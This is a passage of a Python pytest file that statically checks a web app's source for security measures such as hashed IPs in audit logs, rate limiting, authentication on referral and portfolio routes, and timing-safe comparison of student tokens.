# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 24: Audit Logging
# ═══════════════════════════════════════════════════════════════════════════════

class TestAuditLogging:
    """Verify audit middleware logs requests properly."""

    def test_audit_middleware_exists(self):
        audit_path = os.path.join(os.path.dirname(__file__), "..", "middleware", "audit.py")
        if not os.path.exists(audit_path):
            pytest.skip("audit middleware not found")
        with open(audit_path) as f:
            content = f.read()
        assert "api_usage_log" in content

    def test_ip_hashing_not_plain(self):
        """IP addresses must be hashed, not stored in plain text."""
        audit_path = os.path.join(os.path.dirname(__file__), "..", "middleware", "audit.py")
        if not os.path.exists(audit_path):
            pytest.skip("audit middleware not found")
        with open(audit_path) as f:
            content = f.read()
        assert "hash" in content.lower() or "sha" in content.lower(), \
            "IP addresses not hashed in audit logs"


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 25: FMP Client
# ═══════════════════════════════════════════════════════════════════════════════

class TestFMPClient:
    """Test FMP API client security and rate limiting."""

    def test_fmp_client_has_rate_limiting(self):
        fmp_path = os.path.join(os.path.dirname(__file__), "..", "fmp_client.py")
        if not os.path.exists(fmp_path):
            pytest.skip("fmp_client.py not found")
        with open(fmp_path) as f:
            content = f.read()
        assert "sleep" in content or "rate" in content.lower() or "throttle" in content.lower(), \
            "FMP client has no rate limiting"

    def test_fmp_key_from_env(self):
        fmp_path = os.path.join(os.path.dirname(__file__), "..", "fmp_client.py")
        if not os.path.exists(fmp_path):
            pytest.skip("fmp_client.py not found")
        with open(fmp_path) as f:
            content = f.read()
        assert "os.environ" in content or "os.getenv" in content or "FMP_KEY" in content


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 26: Referral System
# ═══════════════════════════════════════════════════════════════════════════════

class TestReferralSystem:
    """Test referral system for abuse prevention."""

    def test_referral_route_requires_auth(self):
        """All referral endpoints must require authentication."""
        ref_path = os.path.join(os.path.dirname(__file__), "..", "routes", "referral.py")
        if not os.path.exists(ref_path):
            pytest.skip("referral.py not found")
        with open(ref_path) as f:
            content = f.read()
        assert "get_current_user" in content, "Referral routes not auth-protected"

    def test_referral_has_rate_limiting(self):
        ref_path = os.path.join(os.path.dirname(__file__), "..", "routes", "referral.py")
        if not os.path.exists(ref_path):
            pytest.skip("referral.py not found")
        with open(ref_path) as f:
            content = f.read()
        assert "limiter" in content, "Referral routes not rate-limited"


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 27: Student Verification
# ═══════════════════════════════════════════════════════════════════════════════

class TestStudentVerification:
    """Test student discount verification security."""

    def test_student_email_validation(self):
        """Student verification must require .edu email."""
        pricing_path = os.path.join(os.path.dirname(__file__), "..", "routes", "pricing.py")
        if not os.path.exists(pricing_path):
            pytest.skip("pricing.py not found")
        with open(pricing_path) as f:
            content = f.read()
        assert ".edu" in content, "Student verification doesn't check .edu domain"

    def test_student_token_timing_safe(self):
        """Student token comparison must use timing-safe comparison."""
        pricing_path = os.path.join(os.path.dirname(__file__), "..", "routes", "pricing.py")
        if not os.path.exists(pricing_path):
            pytest.skip("pricing.py not found")
        with open(pricing_path) as f:
            content = f.read()
        assert "compare_digest" in content, "Student token not using timing-safe comparison"


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 28: Portfolio Builder
# ═══════════════════════════════════════════════════════════════════════════════

class TestPortfolioBuilder:
    """Test portfolio builder constraints and security."""

    def test_portfolio_builder_requires_auth(self):
        pb_path = os.path.join(os.path.dirname(__file__), "..", "routes", "portfolio_build.py")
        if not os.path.exists(pb_path):
            pytest.skip("portfolio_build.py not found")
        with open(pb_path) as f:
            content = f.read()
        assert "get_current_user" in content

    def test_portfolio_tier_limits_enforced(self):
        """Portfolio creation must enforce tier limits."""
        port_path = os.path.join(os.path.dirname(__file__), "..", "routes", "portfolio.py")
        if not os.path.exists(port_path):
            pytest.skip("portfolio.py not found")
        with open(port_path) as f:
            content = f.read()
        # Should check plan limits
        assert "plan" in content.lower() or "limit" in content.lower() or "max" in content.lower()
